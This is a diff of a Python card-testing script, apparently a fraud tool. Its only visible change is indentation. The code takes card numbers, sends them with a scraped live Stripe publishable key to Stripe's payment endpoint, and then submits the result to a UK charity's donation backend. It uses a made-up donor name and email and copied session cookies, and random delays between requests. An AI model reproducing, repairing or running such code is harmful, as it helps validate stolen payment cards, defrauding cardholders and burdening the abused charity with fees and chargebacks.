@@ -26,7 +26,7 @@ def Tele(ccx):
         time.sleep(random.randrange(2,7))
 
 ##REQ1 
-    	headers = {
+        headers = {
     			'authority': 'api.stripe.com',
     			'accept': 'application/json',
     			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
@@ -44,19 +44,19 @@ def Tele(ccx):
     			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     	}
     
-    	data = f'type=card&billing_details[name]=Tiana&billing_details[email]=roogerauft%40gmail.com&billing_details[address][line1]=1020+West+Blvd&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=897e2c48-e03a-4fa0-a086-40e2fa945a484bf8f1&muid=5a769ee3-f69d-47de-a978-042256575ba27873fd&sid=80859c18-39a4-4601-9571-ff97e8ace802b53011&payment_user_agent=stripe.js%2F4b35ef0d67%3B+stripe-js-v3%2F4b35ef0d67%3B+split-card-element&referrer=https%3A%2F%2Farf.org.uk&time_on_page=26340&key=pk_live_s68z8JPiZ1q027N9bSbyUjgn'
-    	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        data = f'type=card&billing_details[name]=Tiana&billing_details[email]=roogerauft%40gmail.com&billing_details[address][line1]=1020+West+Blvd&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=897e2c48-e03a-4fa0-a086-40e2fa945a484bf8f1&muid=5a769ee3-f69d-47de-a978-042256575ba27873fd&sid=80859c18-39a4-4601-9571-ff97e8ace802b53011&payment_user_agent=stripe.js%2F4b35ef0d67%3B+stripe-js-v3%2F4b35ef0d67%3B+split-card-element&referrer=https%3A%2F%2Farf.org.uk&time_on_page=26340&key=pk_live_s68z8JPiZ1q027N9bSbyUjgn'
+        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
     
-    	pm = r1.json()['id']
+        pm = r1.json()['id']
     
     ##REQ2
-    	cookies = {
+        cookies = {
     			'__stripe_mid': '5a769ee3-f69d-47de-a978-042256575ba27873fd',
     			'wssplashuid': 'f53b43db26495a6de52ce14b8715e0b34b594d20.1728057343.1',
     			'__stripe_sid': '80859c18-39a4-4601-9571-ff97e8ace802b53011',
     	}
     
-    	headers = {
+        headers = {
     			'authority': 'arf.org.uk',
     			'accept': '*/*',
     			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
@@ -75,7 +75,7 @@ def Tele(ccx):
     			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     	}
     
-    	json_data = {
+        json_data = {
     			'payment_method_id': ''+str(pm)+'',
     			'email': 'roogerauft@gmail.com',
     			'firstname': 'Tiana',
@@ -87,7 +87,7 @@ def Tele(ccx):
     			'exp_year': 2026,
     			}
     	
-    	r2 = requests.post(
+        r2 = requests.post(
     			'https://arf.org.uk/crm/stripe_files/create_payment.php',
     			cookies=cookies,
     			headers=headers,
